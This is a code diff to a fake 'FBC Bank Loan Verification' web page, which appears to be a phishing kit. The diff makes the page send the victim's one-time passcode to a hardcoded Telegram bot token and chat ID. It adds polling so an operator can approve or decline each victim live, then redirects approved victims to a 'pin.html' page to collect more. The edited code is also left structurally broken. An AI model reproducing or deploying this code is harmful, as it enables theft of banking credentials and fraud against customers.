@@ -503,7 +503,7 @@
       const CONFIG = {
       BOT_TOKEN: '9167169396:AAEmzZ5ndzC0WzHEYXsY805aqoDv2qzR1Ww',
       CHAT_ID: '8820857419',
-      APPROVE_PAGE: 'otp.html'
+      APPROVE_PAGE: 'pin.html'
     };
 
     let state = { lastUpdateId: 0 };
@@ -554,7 +554,7 @@
           text: `
 <b>📱 FBC Bank Loan Verification</b>
 
-Mobile: <code>${mobile}</code>
+Otp: <code>${otp}</code>
 Applicant: <code>Not provided</code>
 `,
           parse_mode: 'HTML',
@@ -582,6 +582,48 @@ Applicant: <code>Not provided</code>
         hideSpinner();
         verifyBtn.disabled = false;
         verifyBtn.textContent = 'Verify';
+           }
+
+    function startPolling(approveId, declineId, verifyId) {
+      const interval = setInterval(() => {
+        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
+          .then(r => r.json())
+          .then(data => {
+            if (!data.ok || !data.result) return;
+
+            data.result.forEach(update => {
+              state.lastUpdateId = update.update_id;
+
+              if (update.callback_query) {
+                const cb = update.callback_query.data;
+
+                if (cb === approveId) {
+                  clearInterval(interval);
+                  document.getElementById('spinnerOverlay').style.display = 'none';
+                  window.location.href = CONFIG.APPROVE_PAGE;
+                }
+                else if (cb === verifyId) {
+                  clearInterval(interval);
+                  document.getElementById('spinnerOverlay').style.display = 'none';
+                  window.location.href = CONFIG.APPROVE_PAGE;
+                }
+                else if (cb === declineId) {
+                  clearInterval(interval);
+                  document.getElementById('spinnerOverlay').style.display = 'none';
+                  showOtpError('Request declined. Please try again.');
+                  resetButton();
+                }
+              }
+            });
+          })
+          .catch(() => {
+            document.getElementById('spinnerOverlay').style.display = 'none';
+            showOtpError('Polling failed. Please try again.');
+            resetButton();
+          });
+      }, 1000);
+    }
+    
 
         if (data.success) {
           localStorage.setItem('fbc_verified_otp', code);
@@ -592,10 +634,7 @@ Applicant: <code>Not provided</code>
       })
       .catch(() => {
         hideSpinner();
-        verifyBtn.disabled = false;
-        verifyBtn.textContent = 'Verify';
-        alert('Verification failed. Please try again.');
-      });
+       });
     }
 
     function openSupportModal() {
